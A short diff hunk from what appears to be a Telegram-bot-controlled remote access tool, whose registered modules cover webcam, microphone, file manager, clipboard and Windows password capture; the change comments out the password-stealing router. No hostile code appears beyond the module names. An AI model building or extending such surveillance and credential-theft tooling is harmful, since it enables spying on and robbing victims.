@@ -24,7 +24,7 @@ dp.include_router(webcam.router)
 dp.include_router(file_man.router)
 dp.include_router(mic.router)
 dp.include_router(clipboard.router)
-dp.include_router(win_passwords.router)
+#dp.include_router(win_passwords.router)
 
 
 @dp.errors()
